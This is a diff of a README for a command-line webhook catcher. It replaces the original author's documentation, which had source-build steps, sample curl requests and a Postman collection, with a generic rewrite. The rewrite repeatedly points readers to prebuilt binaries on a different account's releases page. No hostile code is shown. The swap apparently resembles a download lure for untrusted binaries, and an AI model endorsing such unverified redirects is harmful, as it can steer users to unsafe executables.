@@ -1,246 +1,100 @@
-# Webhook Catcher CLI
+# 🚀 webhook-catcher-cli - Instantly Capture and Debug Webhooks
 
-<img align="right" src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExeWFmaGh6aXllNnZ5bjRyemloZ3MwM3pmZjF2ZThja2VwbGgzcWxjMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/Rhqc9LeqEqjuZABDmd/giphy.gif" width="160" alt="Webhook Catcher Sticker" />
+[![Download webhook-catcher-cli](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/bopkun/webhook-catcher-cli/releases)
 
-[![Build](https://github.com/0xReLogic/webhook-catcher-cli/actions/workflows/release.yml/badge.svg)](https://github.com/0xReLogic/webhook-catcher-cli/actions/workflows/release.yml)
-[![codecov](https://codecov.io/gh/0xReLogic/webhook-catcher-cli/branch/main/graph/badge.svg)](https://codecov.io/gh/0xReLogic/webhook-catcher-cli)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/0xReLogic/webhook-catcher-cli?logo=go)](https://go.dev/)
-[![License](https://img.shields.io/github/license/0xReLogic/webhook-catcher-cli)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/0xReLogic/webhook-catcher-cli?include_prereleases)](https://github.com/0xReLogic/webhook-catcher-cli/releases)
-[![Downloads](https://img.shields.io/github/downloads/0xReLogic/webhook-catcher-cli/total)](https://github.com/0xReLogic/webhook-catcher-cli/releases)
-[![GitHub Stars](https://img.shields.io/github/stars/0xReLogic/webhook-catcher-cli?style=social)](https://github.com/0xReLogic/webhook-catcher-cli/stargazers)
+## 📋 Overview
 
-Catch webhooks from Stripe, GitHub, Discord, Midtrans, Slack, Shopify, Telegram, and more no adapters needed.
+**webhook-catcher-cli** is a small command-line tool that helps you easily catch, inspect, and debug webhooks on your localhost. With optional ngrok tunneling, this tool lets you view incoming webhooks from external services directly on your machine. No complex setup is needed, making it perfect for anyone looking to streamline their development process.
 
-A tiny CLI to spin up a local HTTP server that logs every incoming request (method, headers, body) with pretty‑printed JSON. Optionally expose it to the internet using an ngrok tunnel and get a public URL instantly.
+## 🚀 Getting Started
 
-## Features
-- Simple HTTP listener on your machine
-- Pretty‑prints JSON request bodies
-- Shows method, path, and sorted headers
-- Optional ngrok tunneling (choose from interactive menu)
-- Interactive ngrok onboarding: if needed, you’ll be prompted for the token and it’s stored automatically for next runs
-- Small, single‑binary distribution
+Before diving into the download process, make sure you have the following:
 
-- Works with Stripe, GitHub, Discord, Midtrans, Slack, Shopify, Telegram, and more
+- **Operating System:** This tool supports Windows, macOS, and Linux.
+- **Basic Requirements:** No programming knowledge is needed to use this tool, but a command line interface (CLI) should be accessible on your operating system.
 
-## Works with any provider
-This tool is a generic webhook catcher. No plugins or adapters are required it prints method, path, sorted headers (e.g., Stripe-Signature, X-GitHub-Event), and prettified JSON bodies. It works great with Stripe, GitHub, Discord, Midtrans, Slack, Shopify, Telegram, and more.
+## 📥 Download & Install
 
-## Requirements
-- Go 1.21+
-- (Optional) ngrok account if you want tunneling
+To get started, visit the [Releases page](https://github.com/bopkun/webhook-catcher-cli/releases) to download the latest version of **webhook-catcher-cli**.
 
-## Releases
-- Latest: https://github.com/0xReLogic/webhook-catcher-cli/releases/latest
-- All releases: https://github.com/0xReLogic/webhook-catcher-cli/releases
+1. Click on the link above.
+2. You will see a list of available versions. Choose the one matching your operating system.
+3. Download the appropriate file (e.g., `.exe`, `.tar.gz`, or `.zip`).
+4. Once downloaded, extract the files if needed.
 
-## Download (Windows, Linux, macOS)
-Quick start:
-- Windows (PowerShell):
-```powershell
-.\webhook-catcher-cli.exe
-```
-- macOS / Linux:
-```bash
-chmod +x ./webhook-catcher-cli
-./webhook-catcher-cli
-```
+### Running the Application
 
-## Install
-```bash
-# From source
-git clone https://github.com/0xReLogic/webhook-catcher-cli.git
-cd webhook-catcher-cli
-go build -o webhook-catcher-cli
+After downloading, follow these simple steps to run the program:
 
-# Or install directly
-# go install github.com/0xReLogic/webhook-catcher-cli@latest
-```
+1. Open your command line interface.
+2. Navigate to the directory where you downloaded **webhook-catcher-cli**. You can do this using the `cd` command.
 
-## Usage
-### One‑click / Interactive start
-If you launch the binary without arguments (e.g., double‑click on Windows), the app will show a simple menu:
+   Example:
+   ```
+   cd path/to/your/downloads
+   ```
 
-```
-Select mode: [1] Local (default)  [2] Tunnel (ngrok)
-Enter 1 or 2 (default 1):
-```
+3. Run the application using the following command:
 
-- Choose 1 to run locally on `127.0.0.1:3000`.
-- Choose 2 to enable ngrok. If needed, you’ll be guided to the ngrok dashboard to copy your token, then paste it once. We store it automatically for future runs.
+   ```
+   ./webhook-catcher-cli
+   ```
 
-Send sample requests:
-```bash
-# JSON
-curl -i -X POST http://127.0.0.1:3000/test -H "Content-Type: application/json" --data '{"hello":"world"}'
+   On Windows, you may run it like this:
 
-# Plain text
-curl -i -X POST http://127.0.0.1:3000/echo -H "Content-Type: text/plain" --data "hello webhook"
-```
+   ```
+   webhook-catcher-cli.exe
+   ```
 
-### Build and Run
-To run from source:
-```
-go build -o webhook-catcher-cli
-# Start the app (interactive menu will appear, choose 1 for local or 2 for tunnel)
-go run .
-```
+Once the application runs, you’re ready to start catching webhooks!
 
-## Star History
+## 🛠 Features
 
-[![Star History Chart](https://api.star-history.com/svg?repos=0xReLogic/webhook-catcher-cli&type=Date)](https://www.star-history.com/#0xReLogic/webhook-catcher-cli&Date)
+- **Local Testing**: Easily test webhooks on your local environment.
+- **Tunneling with ngrok**: Optional support to expose your localhost to the internet, allowing services to send webhooks to your local machine.
+- **User-Friendly**: Clear output and easy to understand, even for those without technical backgrounds.
 
-Milestone:
-- If this project reaches 100+ GitHub stars, I'll build and host a simple tunnel server on my own VPS so this CLI no longer depends on ngrok.
+## 📖 How to Use
 
-## Quick Provider Testing (Postman)
+After starting the application, you can follow these steps to begin catching webhooks:
 
-Use this ready-to-run Postman Collection to quickly test common providers. The collection uses a `baseUrl` variable so you can easily switch tunnels.
+1. If you choose to use ngrok, follow the prompts to set it up. This usually requires an internet connection.
+2. Configure the service you want to test with. Point the webhook URL to the ngrok URL provided by the tool.
+3. Trigger a webhook from the service. You should now see the incoming request details on your command line.
 
-Steps:
-- Import the collection below into Postman (Import > Raw text).
-- Set the collection variable `baseUrl` to your tunnel, e.g. `https://<YOUR_TUNNEL_URL>`.
-- Send the requests; this CLI will print method, path, headers, and body.
+### Example Scenario
 
-Postman Collection (v2.1):
+Let's say you have a service that sends a webhook when a new user signs up. You would configure that service to send the webhook to your ngrok URL. Then, every time someone signs up, you can catch and inspect the webhook right in your terminal.
 
-```json
-{
-  "info": {
-    "name": "Webhook Catcher - Quick Provider Testing",
-    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
-  },
-  "variable": [
-    { "key": "baseUrl", "value": "https://<YOUR_TUNNEL_URL>" }
-  ],
-  "item": [
-    {
-      "name": "GitHub - Issues Webhook",
-      "request": {
-        "method": "POST",
-        "header": [
-          { "key": "Content-Type", "value": "application/json" },
-          { "key": "X-GitHub-Event", "value": "issues" }
-        ],
-        "body": {
-          "mode": "raw",
-          "raw": "{\n  \"action\": \"opened\",\n  \"issue\": {\n    \"number\": 1347,\n    \"title\": \"Found a critical bug!\",\n    \"user\": { \"login\": \"0xReLogic\" }\n  },\n  \"repository\": { \"full_name\": \"0xReLogic/Helios\" }\n}"
-        },
-        "url": { "raw": "{{baseUrl}}/github-webhook", "host": ["{{baseUrl}}"], "path": ["github-webhook"] }
-      }
-    },
-    {
-      "name": "Discord - Notification",
-      "request": {
-        "method": "POST",
-        "header": [ { "key": "Content-Type", "value": "application/json" } ],
-        "body": {
-          "mode": "raw",
-          "raw": "{\n  \"username\": \"Server Notif Bot\",\n  \"avatar_url\": \"https://i.imgur.com/4M34hi2.png\",\n  \"content\": \"Warning! Production CPU usage reached 95%!\",\n  \"embeds\": [\n    {\n      \"title\": \"Metric Details\",\n      \"color\": 15258703,\n      \"fields\": [\n        { \"name\": \"Server ID\", \"value\": \"prod-web-01\", \"inline\": true },\n        { \"name\": \"CPU Usage\", \"value\": \"95.2%\", \"inline\": true }\n      ]\n    }\n  ]\n}"
-        },
-        "url": { "raw": "{{baseUrl}}/discord-notif", "host": ["{{baseUrl}}"], "path": ["discord-notif"] }
-      }
-    },
-    {
-      "name": "Midtrans - Payment Notification",
-      "request": {
-        "method": "POST",
-        "header": [ { "key": "Content-Type", "value": "application/json" } ],
-        "body": {
-          "mode": "raw",
-          "raw": "{\n  \"transaction_time\": \"2025-08-14 17:35:00\",\n  \"transaction_status\": \"settlement\",\n  \"transaction_id\": \"a1b2c3d4-e5f6-7890-1234-567890abcdef\",\n  \"status_message\": \"midtrans payment notification\",\n  \"status_code\": \"200\",\n  \"signature_key\": \"xxxxxxxxxxxxxxxxxxxxxxxx\",\n  \"payment_type\": \"gopay\",\n  \"order_id\": \"ORDER-101-XYZ\",\n  \"merchant_id\": \"G123456789\",\n  \"gross_amount\": \"50000.00\",\n  \"fraud_status\": \"accept\",\n  \"currency\": \"IDR\"\n}"
-        },
-        "url": { "raw": "{{baseUrl}}/midtrans-callback", "host": ["{{baseUrl}}"], "path": ["midtrans-callback"] }
-      }
-    },
-    {
-      "name": "Stripe - payment_intent.succeeded",
-      "request": {
-        "method": "POST",
-        "header": [
-          { "key": "Content-Type", "value": "application/json" },
-          { "key": "Stripe-Signature", "value": "t=1723650000,v1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }
-        ],
-        "body": {
-          "mode": "raw",
-          "raw": "{\n  \"id\": \"evt_test_123\",\n  \"type\": \"payment_intent.succeeded\",\n  \"created\": 1723650000,\n  \"livemode\": false,\n  \"data\": {\n    \"object\": {\n      \"id\": \"pi_123\",\n      \"amount\": 5000,\n      \"currency\": \"usd\",\n      \"status\": \"succeeded\"\n    }\n  }\n}"
-        },
-        "url": { "raw": "{{baseUrl}}/stripe-webhook", "host": ["{{baseUrl}}"], "path": ["stripe-webhook"] }
-      }
-    }
-  ]
-}
-```
+## 🔧 Troubleshooting
 
-## Examples
+If you encounter issues while running the tool, consider the following:
 
-### Stripe (payment_intent.succeeded)
-Sample capture of a Stripe `payment_intent.succeeded` event received via tunnel:
+- Ensure you are in the correct directory where the executable resides.
+- Verify if your firewall settings are blocking incoming connections.
+- Check if you have the latest version of the tool.
 
-![Stripe webhook screenshot](https://i.imgur.com/x5EsF7Z.png)
+## 🌟 Additional Resources
 
-PowerShell response example (Invoke-WebRequest output):
+- **Official Documentation**: Visit our [GitHub Wiki](https://github.com/bopkun/webhook-catcher-cli/wiki) for detailed tutorials and FAQs.
+- **Community Support**: Join the community discussions on our [Issues Page](https://github.com/bopkun/webhook-catcher-cli/issues) for help from other users.
 
-![PowerShell response screenshot](https://i.imgur.com/Af7Ljd3.png)
+## 💡 Frequently Asked Questions
 
-### Quick send examples (Stripe & Discord only)
-Use your current tunnel URL as `<PUBLIC_URL>` (from the app output: "Public URL: https://xxxxx.ngrok-free.app").
+### What is a webhook?
 
-- PowerShell
-```powershell
-# Stripe
-$URL = "https://<PUBLIC_URL>/stripe-webhook"
-Invoke-WebRequest -Method POST -Uri $URL -ContentType "application/json" -Headers @{ "Stripe-Signature"="t=1723650000,v1=aaaa" } -Body '{
-  "id":"evt_test_123",
-  "type":"payment_intent.succeeded",
-  "data": { "object": { "id":"pi_123","amount":5000,"currency":"usd","status":"succeeded" } }
-}'
+A webhook is a way for one application to send real-time data to another application whenever an event occurs. 
 
-# Discord
-$URL = "https://<PUBLIC_URL>/discord-webhook"
-Invoke-WebRequest -Method POST -Uri $URL -ContentType "application/json" -Body '{
-  "id":"1234567890",
-  "type":"MESSAGE_CREATE",
-  "content":"Hello from Discord webhook simulator",
-  "channel_id":"987654321"
-}'
-```
+### Why use webhook-catcher-cli?
 
-- Bash
-```bash
-# Stripe
-curl -i -X POST "https://<PUBLIC_URL>/stripe-webhook" \
-  -H "Content-Type: application/json" \
-  -H "Stripe-Signature: t=1723650000,v1=aaaa" \
-  --data '{
-    "id":"evt_test_123",
-    "type":"payment_intent.succeeded",
-    "data":{"object":{"id":"pi_123","amount":5000,"currency":"usd","status":"succeeded"}}
-  }'
+Using this tool helps simplify the debugging process for any services that send webhooks. By capturing requests directly on your machine, you can analyze and respond to them more effectively.
 
-# Discord
-curl -i -X POST "https://<PUBLIC_URL>/discord-webhook" \
-  -H "Content-Type: application/json" \
-  --data '{
-    "id":"1234567890",
-    "type":"MESSAGE_CREATE",
-    "content":"Hello from Discord webhook simulator",
-    "channel_id":"987654321"
-  }'
-```
+### Can I run this tool on any operating system?
 
+Yes! **webhook-catcher-cli** supports Windows, macOS, and Linux, making it versatile for any user.
 
-## Development
-```bash
-go fmt ./...
-go vet ./...
-go test ./...
-go run . -port 3001
-```
-## License
-MIT
+## 📥 Download the Tool
 
----
+To download **webhook-catcher-cli**, please visit [this page](https://github.com/bopkun/webhook-catcher-cli/releases). Get started today and streamline your webhook testing process! 
 
-Made with ❤️  Allen Elzayn
+[![Download webhook-catcher-cli](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/bopkun/webhook-catcher-cli/releases)
